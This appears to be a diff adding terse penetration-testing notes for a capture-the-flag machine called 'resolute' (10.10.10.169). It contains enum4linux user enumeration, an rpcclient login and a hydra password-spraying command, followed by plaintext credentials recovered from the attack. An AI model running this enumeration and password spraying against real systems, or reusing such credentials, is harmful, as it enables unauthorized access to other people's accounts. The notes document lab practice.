@@ -1,0 +1,11 @@
+enum4linux -U 10.10.10.169
+rpcclient -U marko resolute
+hydra -L username.txt -p Welcome123! resolute
+
+login: melanie
+password: Welcome123!
+
+another user: ryan
+password Serv3r4Admin4cc123!
+
+
